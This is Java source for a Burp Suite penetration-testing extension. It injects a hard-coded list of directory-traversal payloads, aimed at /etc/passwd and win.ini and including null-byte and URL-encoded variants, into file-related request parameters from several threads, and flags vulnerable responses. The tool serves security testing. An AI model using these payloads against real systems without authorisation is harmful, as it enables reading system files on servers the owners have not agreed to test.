package burp;

import javax.swing.*;
import javax.swing.table.AbstractTableModel;
import javax.swing.table.TableModel;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.PrintWriter;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;

public class BurpExtender extends AbstractTableModel implements IBurpExtender, IContextMenuFactory, ITab,IMessageEditorController{
    private IBurpExtenderCallbacks callbacks;
    private IExtensionHelpers helpers;

    private PrintWriter stdout;
    private PrintWriter stderr;
    private String ExtenderName = "Security PenTesting_Tool";
    private ArrayList<String> dir_traversal_vpayloads = new ArrayList<String>();

    private JSplitPane splitPane;
    private IMessageEditor requestViewer;
    private IMessageEditor responseViewer;
    private final List<LogEntry> log = new ArrayList<LogEntry>();
    private IHttpRequestResponse currentlyDisplayedItem;

    @Override
    public void registerExtenderCallbacks(IBurpExtenderCallbacks callbacks)
    {
        stdout = new PrintWriter(callbacks.getStdout(), true);
        stderr = new PrintWriter(callbacks.getStderr(), true);
        stdout.println(ExtenderName);
        this.callbacks = callbacks;
        Directory_Traversal_Vpayloads(); //目录穿越漏洞payloads
        helpers = callbacks.getHelpers();
        callbacks.setExtensionName(ExtenderName);
        callbacks.registerContextMenuFactory(this);

        SwingUtilities.invokeLater(new Runnable()
        {
            @Override
            public void run()
            {
                // main split pane
                splitPane = new JSplitPane(JSplitPane.VERTICAL_SPLIT);

                // table of log entries
                Table logTable = new Table(BurpExtender.this);
                JScrollPane scrollPane = new JScrollPane(logTable);
                splitPane.setLeftComponent(scrollPane);

                // tabs with request/response viewers
                JTabbedPane tabs = new JTabbedPane();
                requestViewer = callbacks.createMessageEditor(BurpExtender.this, false);
                responseViewer = callbacks.createMessageEditor(BurpExtender.this, false);
                tabs.addTab("Request", requestViewer.getComponent());
                tabs.addTab("Response", responseViewer.getComponent());
                splitPane.setRightComponent(tabs);

                // customize our UI components
                callbacks.customizeUiComponent(splitPane);
                callbacks.customizeUiComponent(logTable);
                callbacks.customizeUiComponent(scrollPane);
                callbacks.customizeUiComponent(tabs);

                // add the custom tab to Burp's UI
                callbacks.addSuiteTab(BurpExtender.this);
            }
        });
    }

    @Override
    public String getTabCaption()
    {
        return "Security_PenTesting's results";
    }

    @Override
    public Component getUiComponent()
    {
        return splitPane;
    }

    public void Directory_Traversal_Vpayloads(){
        dir_traversal_vpayloads.add("/etc/passwd");
        dir_traversal_vpayloads.add("/etc/passwd%00");
        dir_traversal_vpayloads.add("../etc/passwd");
        dir_traversal_vpayloads.add("../etc/passwd%00");
        dir_traversal_vpayloads.add("../../etc/passwd");
        dir_traversal_vpayloads.add("../../etc/passwd%00");
        dir_traversal_vpayloads.add("../../../etc/passwd");
        dir_traversal_vpayloads.add("../../../etc/passwd%00");
        dir_traversal_vpayloads.add("../../../../etc/passwd");
        dir_traversal_vpayloads.add("../../../../etc/passwd%00");
        dir_traversal_vpayloads.add("../../../../../etc/passwd");
        dir_traversal_vpayloads.add("../../../../../etc/passwd%00");
        dir_traversal_vpayloads.add("../../../../../../etc/passwd");
        dir_traversal_vpayloads.add("../../../../../../etc/passwd%00");
        dir_traversal_vpayloads.add("../../../../../../../etc/passwd");
        dir_traversal_vpayloads.add("../../../../../../../../etc/passwd");
        dir_traversal_vpayloads.add("../../../../../../../../../etc/passwd");
        dir_traversal_vpayloads.add("../../../../../../../../../../etc/passwd");
        dir_traversal_vpayloads.add("../../../../../../../../../../../etc/passwd");
        dir_traversal_vpayloads.add("../../../../../../../../../../../../etc/passwd");
        dir_traversal_vpayloads.add("../../../../../../../../../../../../../etc/passwd");
        dir_traversal_vpayloads.add("../../../../../../../../../../../../../../etc/passwd");
        dir_traversal_vpayloads.add("../../../../../../../../../../../../../../../etc/passwd");
        dir_traversal_vpayloads.add("../../../../../../../../../../../../../../../../etc/passwd");
        dir_traversal_vpayloads.add("../../../../../../../../../../../../../../../../../etc/passwd");
        dir_traversal_vpayloads.add("../../../../../../../../../../../../../../../../../../etc/passwd");
        dir_traversal_vpayloads.add("../../../../../../../../../../../../../../../../../../../etc/passwd");
        dir_traversal_vpayloads.add("../../../../../../../../../../../../../../../../../../../../etc/passwd");
        dir_traversal_vpayloads.add("../../../../../../../../../../../../../../../../../../../../../etc/passwd");
        dir_traversal_vpayloads.add("../../../../../../../../../../../../../../../../../../../../../../etc/passwd");
        dir_traversal_vpayloads.add("..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd");
        dir_traversal_vpayloads.add("..%2F..%2F..%2F%2F..%2F..%2Fetc/passwd");
        dir_traversal_vpayloads.add("..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/win.ini");
        dir_traversal_vpayloads.add("../windows/win.ini");
        dir_traversal_vpayloads.add("../../windows/win.ini");
        dir_traversal_vpayloads.add("../../../windows/win.ini");
        dir_traversal_vpayloads.add("../../../../windows/win.ini");
        dir_traversal_vpayloads.add("../../../../../windows/win.ini");
        dir_traversal_vpayloads.add("../../../../../../windows/win.ini");
        dir_traversal_vpayloads.add("../../../../../../../windows/win.ini");
        dir_traversal_vpayloads.add("../../../../../../../../windows/win.ini");
        dir_traversal_vpayloads.add("../../../../../../../../../windows/win.ini");
        dir_traversal_vpayloads.add("../../../../../../../../../../windows/win.ini");
        dir_traversal_vpayloads.add("../../../../../../../../../../../windows/win.ini");
        dir_traversal_vpayloads.add("../../../../../../../../../../../../windows/win.ini");
        dir_traversal_vpayloads.add("../../../../../../../../../../../../../windows/win.ini");
    }

    @Override
    public List<JMenuItem> createMenuItems(IContextMenuInvocation invocation) {
        ArrayList<JMenuItem> menu_item_list = new ArrayList<JMenuItem>();
        JMenu menu = new JMenu("Security PenTesting_Tool");
        JMenuItem menuItem = new JMenuItem("Directory_Traversal_Vulnerability_Test");
        menuItem.addActionListener(new Directory_Traversal_Vulnerability(invocation));
        menu.add(menuItem);
        menu_item_list.add(menu);
        return menu_item_list;
    }

    public class Directory_Traversal_Vulnerability implements ActionListener{
        private IContextMenuInvocation invocation;

        public Directory_Traversal_Vulnerability(IContextMenuInvocation invocation) {
            this.invocation  = invocation;
        }

        @Override
        public void actionPerformed(ActionEvent event) {
            try {
                IHttpRequestResponse[] messages = invocation.getSelectedMessages();
                IRequestInfo analyzeRequest = helpers.analyzeRequest(messages[0]);
                URL url = analyzeRequest.getUrl();
                if(url.toString().contains("page") || url.toString().contains("filename") || url.toString().contains("filepath")
                        || url.toString().contains("file") || url.toString().contains("path")) {
                    List<String> req_headers = analyzeRequest.getHeaders();
                    Directory_Traversal_vulCheck directory_traversal_vulCheck = new Directory_Traversal_vulCheck(req_headers,messages,url.toString());
                    for(int i=0;i<=5;i++){
                        new Thread(directory_traversal_vulCheck).start();
                    }
                }
            } catch (Exception e) {
                stderr.println(e.getMessage());
            }
        }
    }

    public class Directory_Traversal_vulCheck implements Runnable{

        List<String> req_headers;
        IHttpRequestResponse[] messages;
        String url;
        int length;
        boolean match = false;

        Directory_Traversal_vulCheck(List<String> req_headers,IHttpRequestResponse[] messages,String url){
            this.req_headers = req_headers;
            this.messages = messages;
            this.url = url;
            this.length = dir_traversal_vpayloads.size();
        }

        @Override
        public void run() {
            while (true){
                synchronized (this){
                    if(match == false){
                        if(length>0){
                            String header_url = req_headers.get(0);
                            header_url = header_url.replaceAll("page=[^&]*", "page=" + dir_traversal_vpayloads.get(length-1));
                            header_url = header_url.replaceAll("file=[^&]*", "file=" + dir_traversal_vpayloads.get(length-1));
                            header_url = header_url.replaceAll("filepath=[^&]*", "filepath=" + dir_traversal_vpayloads.get(length-1));
                            header_url = header_url.replaceAll("filePath=[^&]*", "filePath=" + dir_traversal_vpayloads.get(length-1));
                            header_url = header_url.replaceAll("filename=[^&]*", "filename=" + dir_traversal_vpayloads.get(length-1));
                            header_url = header_url.replaceAll("fileName=[^&]*", "fileName=" + dir_traversal_vpayloads.get(length-1));
                            header_url = header_url.endsWith("") ? header_url + " HTTP/1.1" : header_url;
                            length --;
                            req_headers.set(0, header_url);
                            byte[] new_Request = helpers.buildHttpMessage(req_headers, "".getBytes());
                            //如果修改了header或者数修改了body，不能通过updateParameter，使用这个方法。
                            IHttpRequestResponse newIHttpRequestResponse = callbacks.makeHttpRequest(messages[0].getHttpService(),
                                    new_Request);

                            //重建返回包
                            IResponseInfo analyzedResponse = helpers.analyzeResponse(newIHttpRequestResponse.getResponse());
                            int BodyOffset = analyzedResponse.getBodyOffset();
                            byte[] byte_Response = newIHttpRequestResponse.getResponse();
                            String response = new String(byte_Response); //byte[] to String
                            String res_body = response.substring(BodyOffset).toString();

                            if (res_body.contains("bash") || res_body.contains("nologin") || res_body.contains("16-bit")) {
                                synchronized (log){
                                    int row = log.size();
                                    log.add(new LogEntry(header_url,
                                            callbacks.saveBuffersToTempFiles(newIHttpRequestResponse),
                                            "Directory_Traversal_Vulnerability",
                                            true));
                                    fireTableRowsInserted(row,row);
                                }
                                match = true;
                            }
                        }
                    }else{
                        break;
                    }
                }
            }
        }
    }

    @Override
    public int getRowCount()
    {
        return log.size();
    }

    @Override
    public int getColumnCount()
    {
        return 3;
    }

    @Override
    public String getColumnName(int columnIndex)
    {
        switch (columnIndex)
        {
            case 0:
                return "URL&PARM";
            case 1:
                return "Type";
            case 2:
                return "Exists";
            default:
                return "";
        }
    }

    @Override
    public Class<?> getColumnClass(int columnIndex)
    {
        return String.class;
    }

    @Override
    public Object getValueAt(int rowIndex, int columnIndex)
    {
        LogEntry logEntry = log.get(rowIndex);
        switch (columnIndex)
        {
            case 0:
                return logEntry.url.toString();
            case 1:
                return logEntry.type;
            case 2:
                return logEntry.state;
            default:
                return "";
        }
    }

    @Override
    public byte[] getRequest()
    {
        return currentlyDisplayedItem.getRequest();
    }

    @Override
    public byte[] getResponse()
    {
        return currentlyDisplayedItem.getResponse();
    }

    @Override
    public IHttpService getHttpService()
    {
        return currentlyDisplayedItem.getHttpService();
    }

    private class Table extends JTable
    {
        public Table(TableModel tableModel)
        {
            super(tableModel);
        }

        @Override
        public void changeSelection(int row, int col, boolean toggle, boolean extend)
        {
            // show the log entry for the selected row
            LogEntry logEntry = log.get(row);
            requestViewer.setMessage(logEntry.requestResponse.getRequest(), true);
            responseViewer.setMessage(logEntry.requestResponse.getResponse(), false);
            currentlyDisplayedItem = logEntry.requestResponse;
            super.changeSelection(row, col, toggle, extend);
        }
    }

    private static class LogEntry
    {
        final String url;
        final IHttpRequestResponsePersisted requestResponse;
        final String type;
        final boolean state;

        LogEntry(String url, IHttpRequestResponsePersisted requestResponse, String type, boolean state)
        {
            this.url = url;
            this.requestResponse = requestResponse;
            this.type = type;
            this.state = state;
        }
    }
}

